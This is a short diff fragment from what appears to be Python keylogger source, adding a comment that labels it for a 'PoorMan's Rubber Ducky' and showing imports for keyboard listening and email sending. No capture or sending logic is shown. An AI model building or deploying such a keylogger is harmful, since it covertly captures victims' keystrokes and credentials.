@@ -1,3 +1,5 @@
+#Python Keylogger code which can be used in PoorMan's Rubber Ducky
+
 from pynput.keyboard import Key, Listener
 import smtplib
 from email.mime.text import MIMEText
